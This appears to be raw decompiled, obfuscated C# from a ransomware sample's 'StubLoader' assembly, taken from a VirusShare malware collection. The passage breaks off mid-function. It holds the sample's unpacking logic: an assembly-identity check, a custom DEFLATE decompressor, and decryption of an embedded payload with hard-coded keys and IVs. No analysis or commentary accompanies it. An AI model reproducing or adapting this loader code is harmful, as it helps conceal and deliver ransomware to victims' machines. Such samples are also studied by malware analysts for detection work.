// Decompiled with JetBrains decompiler
// Type: .
// Assembly: StubLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=91dca1aa8aeb9cc2
// MVID: 39BCF4AF-8830-4837-8671-E11FBAC8211F
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.MSIL.Generic-8db8492607a9b32d1e0dbe4fb343609d3b9c6660a9c6d4be2008abddb0a6c3ea.exe

using \u0014\u0002;
using \u0087;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace \u0087
{
  internal sealed class \u008C
  {
    private static bool \u008A([In] Assembly obj0, [In] Assembly obj1)
    {
label_0:
      byte[] publicKey1 = obj0.GetName().GetPublicKey();
      byte[] publicKey2 = obj1.GetName().GetPublicKey();
label_17:
      int num1 = publicKey2 == null ? 1 : 0;
      int num2;
      int num3;
      if (true)
      {
        num3 = publicKey1 == null ? 1 : 0;
        num2 = num1;
      }
      else
        goto label_14;
label_3:
      int index;
      if (num2 != num3)
      {
        int num4 = 0;
        if (num4 == 0)
          return num4 != 0;
        num2 = num4;
      }
      else if (publicKey2 != null)
      {
        index = 0;
        if (false)
          goto label_0;
        else
          goto label_15;
      }
      else
        goto label_16;
label_9:
      num3 = (int) publicKey1[index];
      if (true)
      {
        if (num2 != num3)
          return false;
        if (true)
          num1 = index + 1;
        else
          goto label_17;
      }
      else
        goto label_3;
label_14:
      index = num1;
label_15:
      if (index < publicKey2.Length)
      {
        num2 = (int) publicKey2[index];
        goto label_9;
      }
label_16:
      return true;
    }

    public static unsafe byte[] \u008B([In] byte[] obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(46);
      Assembly callingAssembly = Assembly.GetCallingAssembly();
      if (true)
        goto label_47;
label_7:
      \u008C.\u0012\u0002 obj1;
      *(int*) ((IntPtr) voidPtr + 12) = obj1.\u0011\u0002();
      byte[] numArray1;
      if (true)
      {
        *(int*) ((IntPtr) voidPtr + 16) = obj1.\u0010\u0002();
        *(int*) ((IntPtr) voidPtr + 20) = obj1.\u0010\u0002();
        if (*(int*) ((IntPtr) voidPtr + 16) > 0)
        {
          byte[] buffer = new byte[*(int*) ((IntPtr) voidPtr + 16)];
          obj1.Read(buffer, 0, *(int*) ((IntPtr) voidPtr + 16));
        }
        if (*(int*) ((IntPtr) voidPtr + 20) > 0)
        {
          byte[] buffer = new byte[*(int*) ((IntPtr) voidPtr + 20)];
          obj1.Read(buffer, 0, *(int*) ((IntPtr) voidPtr + 20));
        }
        long length = obj1.Length;
        if (true)
        {
          long position = obj1.Position;
          length -= position;
        }
        byte[] buffer1 = new byte[length];
        obj1.Read(buffer1, 0, buffer1.Length);
        \u008C.\u0090 obj2 = new \u008C.\u0090(buffer1);
        numArray1 = new byte[*(int*) ((IntPtr) voidPtr + 12)];
        obj2.\u008F(numArray1, 0, numArray1.Length);
        goto label_46;
      }
label_23:
      byte[] numArray2 = new byte[8]
      {
        (byte) 197,
        (byte) 189,
        (byte) 123,
        (byte) 112,
        (byte) 173,
        (byte) 122,
        (byte) 103,
        (byte) 21
      };
      \u0089 obj3 = new \u0089();
      byte[] numArray3;
      try
      {
        if (true)
        {
          using (ICryptoTransform cryptoTransform = obj3.\u0088(numArray3, numArray2, true))
            numArray1 = \u008C.\u008B(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
        }
      }
      finally
      {
        while (obj3 != null)
        {
          if (true)
          {
            ((IDisposable) obj3).Dispose();
            break;
          }
        }
      }
label_34:
      if (*(int*) ((IntPtr) voidPtr + 24) == 3)
      {
        byte[] numArray4 = new byte[16]
        {
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1
        };
        byte[] numArray5 = new byte[16]
        {
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2
        };
        using (\u0086 obj4 = new \u0086())
        {
          if (true)
          {
            using (ICryptoTransform cryptoTransform = obj4.\u0082(numArray4, numArray5, true))
              numArray1 = \u008C.\u008B(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
          }
        }
      }
label_46:
      obj1.Close();
      return numArray1;
label_47:
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      if ((object) callingAssembly != (object) executingAssembly && !\u008C.\u008A(executingAssembly, callingAssembly))
        return (byte[]) null;
      obj1 = new \u008C.\u0012\u0002(obj0);
      numArray1 = new byte[0];
      *(int*) voidPtr = obj1.\u0011\u0002();
      if (*(int*) voidPtr == 67324752)
      {
        *(short*) ((IntPtr) voidPtr + 44) = (short) obj1.\u0010\u0002();
        *(int*) ((IntPtr) voidPtr + 4) = obj1.\u0010\u0002();
      }
      else
        goto label_15;
label_4:
      *(int*) ((IntPtr) voidPtr + 8) = obj1.\u0010\u0002();
      if (*(int*) voidPtr != 67324752 || *(short*) ((IntPtr) voidPtr + 44) != (short) 20 || *(int*) ((IntPtr) voidPtr + 4) != 0 || *(int*) ((IntPtr) voidPtr + 8) != 8)
        throw new FormatException("Wrong Header Signature");
      obj1.\u0011\u0002();
      obj1.\u0011\u0002();
      obj1.\u0011\u0002();
      goto label_7;
label_15:
      *(int*) ((IntPtr) voidPtr + 24) = *(int*) voidPtr >> 24;
      *(int*) voidPtr = *(int*) voidPtr - (*(int*) ((IntPtr) voidPtr + 24) << 24);
      if (*(int*) voidPtr != 8223355)
        throw new FormatException("Unknown Header");
      if (true)
      {
        if (*(int*) ((IntPtr) voidPtr + 24) == 1)
        {
          *(int*) ((IntPtr) voidPtr + 28) = obj1.\u0011\u0002();
          numArray1 = new byte[*(int*) ((IntPtr) voidPtr + 28)];
          *(int*) ((IntPtr) voidPtr + 32) = 0;
          while (*(int*) ((IntPtr) voidPtr + 32) < *(int*) ((IntPtr) voidPtr + 28))
          {
            *(int*) ((IntPtr) voidPtr + 36) = obj1.\u0011\u0002();
            *(int*) ((IntPtr) voidPtr + 40) = obj1.\u0011\u0002();
            byte[] buffer = new byte[*(int*) ((IntPtr) voidPtr + 36)];
            obj1.Read(buffer, 0, buffer.Length);
            new \u008C.\u0090(buffer).\u008F(numArray1, *(int*) ((IntPtr) voidPtr + 32), *(int*) ((IntPtr) voidPtr + 40));
            *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) + *(int*) ((IntPtr) voidPtr + 40);
          }
        }
        if (*(int*) ((IntPtr) voidPtr + 24) == 2)
        {
          numArray3 = new byte[8]
          {
            (byte) 130,
            (byte) 30,
            (byte) 197,
            (byte) 145,
            (byte) 20,
            (byte) 199,
            (byte) 215,
            (byte) 169
          };
          goto label_23;
        }
        else
          goto label_34;
      }
      else
        goto label_4;
    }

    internal sealed class \u0090
    {
      private static readonly int[] \u0001;
      private static readonly int[] \u0002;
      private static readonly int[] \u0003;
      private static readonly int[] \u0004;
      private int \u0005;
      private int \u0006;
      private int \u0007;
      private int \u0008;
      private int \u000E;
      private bool \u000F;
      private \u008C.\u0099 \u0010;
      private \u008C.\u0002\u0002 \u0011;
      private \u008C.\u0008\u0002 \u0012;
      private \u008C.\u0005\u0002 \u0013;
      private \u008C.\u0005\u0002 \u0014;

      public \u0090([In] byte[] obj0)
      {
        this.\u0010 = new \u008C.\u0099();
        this.\u0011 = new \u008C.\u0002\u0002();
        this.\u0005 = 2;
        this.\u0010.\u0098(obj0, 0, obj0.Length);
      }

      private unsafe bool \u008D()
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(12);
        int num1 = this.\u0011.\u009E();
        while (true)
        {
          int index1;
          while (num1 >= 258)
          {
            *(int*) ((IntPtr) voidPtr + 8) = this.\u0005;
            switch (*(int*) ((IntPtr) voidPtr + 8))
            {
              case 7:
                int num2 = this.\u0013.\u0004\u0002(this.\u0010);
                if (true)
                {
                  index1 = num2;
                  int num3;
                  for (int index2 = num2 & -256; index2 == 0; index2 = num3)
                  {
                    this.\u0011.\u009A(index1);
                    num3 = num1;
                    if (true)
                    {
                      if ((num1 = num3 - 1) < 258)
                        return true;
                      goto case 7;
                    }
                  }
                  int num4 = index1;
                  num2 = 257;
                  num2 = num4;
                }
                if (num2 < num2)
                {
                  if (index1 < 0)
                    return false;
                  this.\u0014 = (\u008C.\u0005\u0002) null;
                  this.\u0013 = (\u008C.\u0005\u0002) null;
                  this.\u0005 = 2;
                  return true;
                }
                this.\u0007 = \u008C.\u0090.\u0001[index1 - 257];
                this.\u0006 = \u008C.\u0090.\u0002[index1 - 257];
                goto case 8;
              case 8:
                if (this.\u0006 > 0)
                {
                  this.\u0005 = 8;
                  if (true)
                  {
                    *(int*) voidPtr = this.\u0010.\u0091(this.\u0006);
                    if (*(int*) voidPtr < 0)
                      return false;
                    this.\u0010.\u0092(this.\u0006);
                    this.\u0007 += *(int*) voidPtr;
                  }
                  else
                    goto label_21;
                }
                this.\u0005 = 9;
                goto case 9;
              case 9:
                index1 = this.\u0014.\u0004\u0002(this.\u0010);
                goto label_20;
              case 10:
                goto label_23;
              default:
                continue;
            }
          }
          goto label_29;
label_20:
          if (index1 >= 0)
          {
            this.\u0008 = \u008C.\u0090.\u0003[index1];
            this.\u0006 = \u008C.\u0090.\u0004[index1];
          }
          else
            break;
label_23:
          if (this.\u0006 > 0)
          {
            this.\u0005 = 10;
            *(int*) ((IntPtr) voidPtr + 4) = this.\u0010.\u0091(this.\u0006);
            if (*(int*) ((IntPtr) voidPtr + 4) >= 0)
            {
              this.\u0010.\u0092(this.\u0006);
              this.\u0008 += *(int*) ((IntPtr) voidPtr + 4);
            }
            else
              goto label_25;
          }
          this.\u0011.\u009C(this.\u0007, this.\u0008);
          num1 -= this.\u0007;
          this.\u0005 = 7;
          continue;
label_29:
          if (false)
            goto label_20;
          else
            goto label_30;
        }
label_21:
        return false;
label_25:
        return false;
label_30:
        return true;
      }

      private unsafe bool \u008E()
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(12);
        switch (this.\u0005)
        {
          case 2:
            if (this.\u000F)
            {
              this.\u0005 = 12;
              return false;
            }
            *(int*) voidPtr = this.\u0010.\u0091(3);
            if (*(int*) voidPtr < 0)
              return false;
            break;
          case 3:
            if ((this.\u000E = this.\u0010.\u0091(16)) >= 0)
            {
              this.\u0010.\u0092(16);
              goto label_18;
            }
            else
              goto label_15;
          case 4:
label_19:
            *(int*) ((IntPtr) voidPtr + 4) = this.\u0010.\u0091(16);
            int num1 = *(int*) ((IntPtr) voidPtr + 4);
            if (false)
              return num1 != 0;
            if (num1 < 0)
            {
              if (true)
                return false;
              goto case 3;
            }
            else
              goto label_23;
          case 5:
label_24:
            *(int*) ((IntPtr) voidPtr + 8) = this.\u0011.\u009D(this.\u0010, this.\u000E);
            this.\u000E -= *(int*) ((IntPtr) voidPtr + 8);
            if (this.\u000E != 0)
              return !this.\u0010.\u0096();
            this.\u0005 = 2;
            if (true)
              return true;
            break;
          case 6:
            if (!this.\u0012.\u008E(this.\u0010))
              return false;
            this.\u0013 = this.\u0012.\u0006\u0002();
            this.\u0014 = this.\u0012.\u0007\u0002();
            this.\u0005 = 7;
            goto case 7;
          case 7:
          case 8:
          case 9:
          case 10:
            return this.\u008D();
          case 12:
            return false;
          default:
            return false;
        }
        this.\u0010.\u0092(3);
        if ((*(int*) voidPtr & 1) != 0)
          this.\u000F = true;
        int num2 = *(int*) voidPtr;
label_6:
        switch (num2 >> 1)
        {
          case 0:
            this.\u0010.\u0095();
            this.\u0005 = 3;
            break;
          case 1:
            this.\u0013 = \u008C.\u0005\u0002.\u0002;
            this.\u0014 = \u008C.\u0005\u0002.\u0003;
            this.\u0005 = 7;
            if (true)
            {
              if (true)
              {
                if (false)
                  goto label_23;
                else
                  break;
              }
              else
                goto label_15;
            }
            else
              goto label_18;
          case 2:
            this.\u0012 = new \u008C.\u0008\u0002();
            this.\u0005 = 6;
            break;
        }
        return true;
label_15:
        int num3 = 0;
        if (num3 == 0)
          return num3 != 0;
        num2 = num3;
        goto label_6;
label_18:
        this.\u0005 = 4;
        goto label_19;
label_23:
        this.\u0010.\u0092(16);
        this.\u0005 = 5;
        goto label_24;
      }

      public unsafe int \u008F([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(8);
        *(int*) voidPtr = 0;
        int num1;
        int num2;
        do
        {
          num1 = this.\u0005;
          num2 = 11;
          if (num2 != 0)
          {
            if (num1 != num2)
              goto label_8;
label_3:
            if (!this.\u008E())
            {
              int num3 = this.\u0011.\u009F();
              num2 = 0;
              num1 = num3;
              goto label_5;
            }
            else
              continue;
label_8:
            *(int*) ((IntPtr) voidPtr + 4) = this.\u0011.\u0001\u0002(obj0, obj1, obj2);
            obj1 += *(int*) ((IntPtr) voidPtr + 4);
            *(int*) voidPtr = *(int*) voidPtr + *(int*) ((IntPtr) voidPtr + 4);
            obj2 -= *(int*) ((IntPtr) voidPtr + 4);
            if (obj2 != 0)
              goto label_3;
            else
              goto label_2;
          }
label_5:;
        }
        while (num1 > num2 && this.\u0005 != 11);
        goto label_6;
label_2:
        return *(int*) voidPtr;
label_6:
        return *(int*) voidPtr;
      }

      static \u0090()
      {
label_0:
        int length1 = 29;
        while (true)
        {
          int[] numArray1 = new int[length1];
          // ISSUE: field reference
          RuntimeHelpers.InitializeArray((Array) numArray1, __fieldref (\u0013\u0002.\u0005));
          \u008C.\u0090.\u0001 = numArray1;
          while (true)
          {
            \u008C.\u0090.\u0002 = new int[29]
            {
              0,
              0,
              0,
              0,
              0,
              0,
              0,
              0,
              1,
              1,
              1,
              1,
              2,
              2,
              2,
              2,
              3,
              3,
              3,
              3,
              4,
              4,
              4,
              4,
              5,
              5,
              5,
              5,
              0
            };
            if (true)
            {
              \u008C.\u0090.\u0003 = new int[30]
              {
                1,
                2,
                3,
                4,
                5,
                7,
                9,
                13,
                17,
                25,
                33,
                49,
                65,
                97,
                129,
                193,
                257,
                385,
                513,
                769,
                1025,
                1537,
                2049,
                3073,
                4097,
                6145,
                8193,
                12289,
                16385,
                24577
              };
              goto label_5;
            }
          }
          goto label_7;
label_5:
          int length2 = 30;
          if (length2 == 0)
          {
            length1 = length2;
            continue;
          }
          int[] numArray2 = new int[length2];
          // ISSUE: field reference
          RuntimeHelpers.InitializeArray((Array) numArray2, __fieldref (\u0013\u0002.\u0008));
          \u008C.\u0090.\u0004 = numArray2;
label_7:
          if (true)
          {
            if (false)
              goto label_5;
            else
              break;
          }
          else
            goto label_0;
        }
      }
    }

    internal sealed class \u0099
    {
      private byte[] \u0001;
      private int \u0002 = 0;
      private int \u0003 = 0;
      private uint \u0004 = 0;
      private int \u0005 = 0;

      public int \u0091([In] int obj0)
      {
        while (this.\u0005 < obj0)
        {
          if (this.\u0002 == this.\u0003)
          {
            if (true)
            {
              if (true)
                return -1;
            }
            else
              break;
          }
          else if (true)
          {
            \u008C.\u0099 obj1 = this;
            int num1 = (int) obj1.\u0004;
            byte[] numArray1 = this.\u0001;
            \u008C.\u0099 obj2 = this;
            int num2;
            int num3 = num2 = obj2.\u0002;
            obj2.\u0002 = num2 + 1;
            int index1 = num3;
            int num4 = (int) numArray1[index1] & (int) byte.MaxValue;
            byte[] numArray2 = this.\u0001;
            \u008C.\u0099 obj3 = this;
            int num5;
            int num6 = num5 = obj3.\u0002;
            obj3.\u0002 = num5 + 1;
            int index2 = num6;
            int num7 = ((int) numArray2[index2] & (int) byte.MaxValue) << 8;
            int num8 = (num4 | num7) << this.\u0005;
            obj1.\u0004 = (uint) (num1 | num8);
          }
          else
            continue;
          this.\u0005 += 16;
          break;
        }
        long num9 = (long) this.\u0004;
        int num10 = 1;
        int num11 = obj0;
        int num12;
        do
        {
          if (true)
          {
            int num13 = num11 & 31;
            num12 = num10 << num13;
            if (true)
            {
              num11 = 1;
              num10 = num12;
            }
            else
              goto label_15;
          }
        }
        while (num11 == 0);
        int num14 = num10 - num11;
        goto label_13;
label_15:
        num14 = num12;
label_13:
        long num15 = (long) num14;
        return (int) (num9 & num15);
      }

      public void \u0092([In] int obj0)
      {
label_0:
        this.\u0004 >>= obj0;
        do
        {
          if (true)
            this.\u0005 -= obj0;
          else
            goto label_0;
        }
        while (false);
      }

      [SpecialName]
      public int \u0093() => this.\u0005;

      [SpecialName]
      public int \u0094()
      {
        int num1 = this.\u0003;
        int num2;
        int num3;
        while (true)
        {
          num2 = this.\u0002;
          if (true)
          {
            num3 = num1 - num2;
            if (false)
              num1 = num3;
            else
              goto label_7;
          }
          else
            break;
        }
label_2:
        do
        {
          if (true)
            num2 >>= 3;
        }
        while (false);
        return num1 + num2;
label_7:
        num2 = this.\u0005;
        num1 = num3;
        goto label_2;
      }

      public void \u0095()
      {
        this.\u0004 >>= this.\u0005 & 7;
        this.\u0005 &= -8;
      }

      [SpecialName]
      public bool \u0096() => this.\u0002 == this.\u0003;

      public unsafe int \u0097([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(8);
        *(int*) voidPtr = 0;
        int num1;
        int num2;
        int num3;
        while (true)
        {
          int num4 = this.\u0005;
          int num5 = 0;
          while (true)
          {
            if (num5 == 0)
            {
              if (num4 <= num5 || obj2 <= 0)
              {
                if (obj2 != 0)
                {
                  *(int*) ((IntPtr) voidPtr + 4) = this.\u0003 - this.\u0002;
                  int num6 = obj2;
                  num5 = *(int*) ((IntPtr) voidPtr + 4);
                  num4 = num6;
                }
                else
                  break;
              }
              else
                goto label_21;
            }
            if (num4 > num5)
              obj2 = *(int*) ((IntPtr) voidPtr + 4);
            do
            {
              Array.Copy((Array) this.\u0001, this.\u0002, (Array) obj0, obj1, obj2);
            }
            while (false);
            this.\u0002 += obj2;
            num1 = this.\u0002;
            if (true)
            {
              int num7 = this.\u0003;
              num2 = num1 - num7;
              num3 = 1;
              if (num3 == 0)
              {
                num5 = num3;
                num4 = num2;
              }
              else
                goto label_15;
            }
            else
              goto label_20;
          }
          if (false)
            goto label_22;
          else
            break;
label_21:
          obj0[obj1++] = (byte) this.\u0004;
          if (true)
          {
            this.\u0004 >>= 8;
            this.\u0005 -= 8;
            --obj2;
          }
          else
            goto label_16;
label_22:
          *(int*) voidPtr = *(int*) voidPtr + 1;
        }
        return *(int*) voidPtr;
label_15:
        if ((num2 & num3) == 0)
          goto label_19;
label_16:
        if (true)
          this.\u0004 = (uint) this.\u0001[this.\u0002++] & (uint) byte.MaxValue;
        this.\u0005 = 8;
label_19:
        num1 = *(int*) voidPtr;
label_20:
        int num8 = obj2;
        return num1 + num8;
      }

      public void \u0098([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        if (true)
          goto label_6;
label_4:
        this.\u0005 += 8;
label_5:
        this.\u0001 = obj0;
        this.\u0002 = obj1;
        int num;
        this.\u0003 = num;
        return;
label_6:
        if (this.\u0002 < this.\u0003)
          throw new InvalidOperationException();
        num = obj1 + obj2;
        if (0 > obj1 || obj1 > num || num > obj0.Length)
          throw new ArgumentOutOfRangeException();
        if ((obj2 & 1) != 0)
        {
          this.\u0004 |= (uint) (((int) obj0[obj1++] & (int) byte.MaxValue) << this.\u0005);
          goto label_4;
        }
        else
          goto label_5;
      }
    }

    internal sealed class \u0002\u0002
    {
      private byte[] \u0001 = new byte[32768];
      private int \u0002 = 0;
      private int \u0003 = 0;

      public void \u009A([In] int obj0)
      {
label_0:
        do
        {
          \u008C.\u0002\u0002 obj1 = this;
          int num1;
          int num2 = num1 = obj1.\u0003;
          obj1.\u0003 = num1 + 1;
          do
          {
            if (true)
            {
              if (num2 != 32768)
                goto label_3;
label_2:
              goto label_0;
label_3:
              if (true)
              {
                byte[] numArray = this.\u0001;
                \u008C.\u0002\u0002 obj2 = this;
                int num3;
                num2 = num3 = obj2.\u0002;
                obj2.\u0002 = num3 + 1;
                int index = num2;
                int num4 = (int) (byte) obj0;
                numArray[index] = (byte) num4;
                if (false)
                  goto label_2;
              }
              else
                goto label_0;
            }
            else
              goto label_0;
          }
          while (false);
          goto label_5;
        }
        while (false);
        goto label_7;
label_5:
        this.\u0002 &= (int) short.MaxValue;
        return;
label_7:
        throw new InvalidOperationException();
      }

      private void \u009B([In] int obj0, [In] int obj1, [In] int obj2)
      {
        if (false)
          return;
        while (true)
        {
          int num1 = obj1;
          int num2;
          while (true)
          {
            num2 = num1 - 1;
            if (false)
              num1 = num2;
            else
              break;
          }
          obj1 = num2;
          if (num1 > 0)
          {
            byte[] numArray = this.\u0001;
            \u008C.\u0002\u0002 obj = this;
            int num3;
            int num4 = num3 = obj.\u0002;
            obj.\u0002 = num3 + 1;
            int index = num4;
            int num5 = (int) this.\u0001[obj0++];
            numArray[index] = (byte) num5;
            this.\u0002 &= (int) short.MaxValue;
            int num6 = obj0;
            if (true)
              num6 &= (int) short.MaxValue;
            obj0 = num6;
          }
          else
            break;
        }
      }

      public void \u009C([In] int obj0, [In] int obj1)
      {
        if ((this.\u0003 += obj0) > 32768)
          throw new InvalidOperationException();
        int sourceIndex = this.\u0002 - obj1 & (int) short.MaxValue;
        int num = 32768 - obj0;
        if (sourceIndex <= num && this.\u0002 < num)
        {
          if (obj0 <= obj1)
          {
            Array.Copy((Array) this.\u0001, sourceIndex, (Array) this.\u0001, this.\u0002, obj0);
            this.\u0002 += obj0;
          }
          else
          {
            while (obj0-- > 0)
              this.\u0001[this.\u0002++] = this.\u0001[sourceIndex++];
          }
        }
        else
          this.\u009B(sourceIndex, obj0, obj1);
      }

      public unsafe int \u009D([In] \u008C.\u0099 obj0, [In] int obj1)
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(8);
        int val1 = obj1;
        int val2 = 32768;
        if (val2 != 0)
          val2 -= this.\u0003;
        obj1 = Math.Min(Math.Min(val1, val2), obj0.\u0094());
        *(int*) ((IntPtr) voidPtr + 4) = 32768 - this.\u0002;
        if (obj1 > *(int*) ((IntPtr) voidPtr + 4))
        {
          *(int*) voidPtr = obj0.\u0097(this.\u0001, this.\u0002, *(int*) ((IntPtr) voidPtr + 4));
          if (*(int*) voidPtr == *(int*) ((IntPtr) voidPtr + 4))
            *(int*) voidPtr = *(int*) voidPtr + obj0.\u0097(this.\u0001, 0, obj1 - *(int*) ((IntPtr) voidPtr + 4));
        }
        else
          *(int*) voidPtr = obj0.\u0097(this.\u0001, this.\u0002, obj1);
        this.\u0002 = this.\u0002 + *(int*) voidPtr & (int) short.MaxValue;
        this.\u0003 += *(int*) voidPtr;
        return *(int*) voidPtr;
      }

      public int \u009E() => 32768 - this.\u0003;

      public int \u009F() => this.\u0003;

      public unsafe int \u0001\u0002([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(12);
        int num1;
        int num2;
        do
        {
          *(int*) voidPtr = this.\u0002;
          num1 = obj2;
          num2 = this.\u0003;
          if (true)
          {
            if (true)
            {
              if (num1 <= num2)
                goto label_17;
              else
                goto label_16;
label_4:
              *(int*) ((IntPtr) voidPtr + 4) = obj2;
              continue;
label_16:
              obj2 = this.\u0003;
              goto label_4;
label_17:
              *(int*) voidPtr = this.\u0002 - this.\u0003 + obj2 & (int) short.MaxValue;
              goto label_4;
            }
            else
              goto label_10;
          }
          else
            goto label_12;
        }
        while (false);
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 8) = obj2 - *(int*) voidPtr;
          int num3 = *(int*) ((IntPtr) voidPtr + 8);
          int num4 = 0;
          if (num4 == 0)
          {
            if (num3 > num4)
              Array.Copy((Array) this.\u0001, 32768 - *(int*) ((IntPtr) voidPtr + 8), (Array) obj0, obj1, *(int*) ((IntPtr) voidPtr + 8));
            else
              goto label_11;
          }
          else
          {
            num2 = num4;
            num1 = num3;
            goto label_10;
          }
        }
        int num5 = obj1;
        num2 = *(int*) ((IntPtr) voidPtr + 8);
        num1 = num5;
label_10:
        obj1 = num1 + num2;
        obj2 = *(int*) voidPtr;
label_11:
        Array.Copy((Array) this.\u0001, *(int*) voidPtr - obj2, (Array) obj0, obj1, obj2);
        this.\u0003 -= *(int*) ((IntPtr) voidPtr + 4);
        int num6 = this.\u0003;
        num2 = 0;
        num1 = num6;
label_12:
        if (num1 < num2)
          throw new InvalidOperationException();
        return *(int*) ((IntPtr) voidPtr + 4);
      }
    }

    internal sealed class \u0005\u0002
    {
      private short[] \u0001;
      public static readonly \u008C.\u0005\u0002 \u0002;
      public static readonly \u008C.\u0005\u0002 \u0003;

      static \u0005\u0002()
      {
        byte[] numArray = new byte[288];
label_1:
        int num1;
        while (true)
        {
          if (true)
            goto label_18;
label_3:
          if (true)
          {
            while (num1 < 144)
              numArray[num1++] = (byte) 8;
            if (true)
            {
              for (; num1 < 256; numArray[num1++] = (byte) 9)
              {
                if (false)
                  goto label_1;
              }
              goto label_7;
            }
            else
              break;
          }
          else
            goto label_10;
label_18:
          num1 = 0;
          goto label_3;
        }
        goto label_12;
label_7:
        int num2;
        int num3;
        while (true)
        {
          num2 = num1;
          num3 = 280;
          if (num3 != 0)
          {
            if (num2 < num3)
              numArray[num1++] = (byte) 7;
            else
              goto label_10;
          }
          else
            break;
        }
        int num4 = num3;
        int num5 = num2;
        goto label_15;
label_10:
        while (num1 < 288)
          numArray[num1++] = (byte) 8;
        \u008C.\u0005\u0002.\u0002 = new \u008C.\u0005\u0002(numArray);
        numArray = new byte[32];
label_12:
        num1 = 0;
label_14:
        num5 = num1;
        num4 = 32;
label_15:
        if (num5 < num4)
        {
          numArray[num1++] = (byte) 5;
          goto label_14;
        }
        else if (true)
          \u008C.\u0005\u0002.\u0003 = new \u008C.\u0005\u0002(numArray);
        else
          goto label_7;
      }

      public \u0005\u0002([In] byte[] obj0) => this.\u0003\u0002(obj0);

      private unsafe void \u0003\u0002([In] byte[] obj0)
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(68);
        int[] numArray1 = new int[16];
        int[] numArray2 = new int[16];
        *(int*) voidPtr = 0;
        while (*(int*) voidPtr < obj0.Length)
        {
          *(int*) ((IntPtr) voidPtr + 4) = (int) obj0[*(int*) voidPtr];
          if (*(int*) ((IntPtr) voidPtr + 4) > 0)
          {
            int[] numArray3;
            int index;
            int num = (numArray3 = numArray1)[(IntPtr) (index = *(int*) ((IntPtr) voidPtr + 4))] + 1;
            numArray3[index] = num;
          }
          *(int*) voidPtr = *(int*) voidPtr + 1;
        }
        *(int*) ((IntPtr) voidPtr + 8) = 0;
        *(int*) ((IntPtr) voidPtr + 12) = 512;
        *(int*) ((IntPtr) voidPtr + 16) = 1;
        while (*(int*) ((IntPtr) voidPtr + 16) <= 15)
        {
          numArray2[*(int*) ((IntPtr) voidPtr + 16)] = *(int*) ((IntPtr) voidPtr + 8);
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + (numArray1[*(int*) ((IntPtr) voidPtr + 16)] << 16 - *(int*) ((IntPtr) voidPtr + 16));
          if (*(int*) ((IntPtr) voidPtr + 16) >= 10)
          {
            *(int*) ((IntPtr) voidPtr + 20) = numArray2[*(int*) ((IntPtr) voidPtr + 16)] & 130944;
            *(int*) ((IntPtr) voidPtr + 24) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
            *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + (*(int*) ((IntPtr) voidPtr + 24) - *(int*) ((IntPtr) voidPtr + 20) >> 16 - *(int*) ((IntPtr) voidPtr + 16));
          }
          *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + 1;
        }
        this.\u0001 = new short[*(int*) ((IntPtr) voidPtr + 12)];
        *(int*) ((IntPtr) voidPtr + 28) = 512;
        *(int*) ((IntPtr) voidPtr + 32) = 15;
        if (true)
          goto label_15;
label_12:
        *(int*) ((IntPtr) voidPtr + 28) = *(int*) ((IntPtr) voidPtr + 28) + (1 << *(int*) ((IntPtr) voidPtr + 32) - 9);
        *(int*) ((IntPtr) voidPtr + 44) = *(int*) ((IntPtr) voidPtr + 44) + 128;
label_13:
        if (*(int*) ((IntPtr) voidPtr + 44) < *(int*) ((IntPtr) voidPtr + 36))
        {
          this.\u0001[(int) \u008C.\u000F\u0002.\u000E\u0002(*(int*) ((IntPtr) voidPtr + 44))] = (short) (-*(int*) ((IntPtr) voidPtr + 28) << 4 | *(int*) ((IntPtr) voidPtr + 32));
          goto label_12;
        }
        else
          *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) - 1;
label_15:
        if (*(int*) ((IntPtr) voidPtr + 32) >= 10)
        {
          *(int*) ((IntPtr) voidPtr + 36) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) - (numArray1[*(int*) ((IntPtr) voidPtr + 32)] << 16 - *(int*) ((IntPtr) voidPtr + 32));
          *(int*) ((IntPtr) voidPtr + 40) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
          *(int*) ((IntPtr) voidPtr + 44) = *(int*) ((IntPtr) voidPtr + 40);
          goto label_13;
        }
        else
        {
          *(int*) ((IntPtr) voidPtr + 48) = 0;
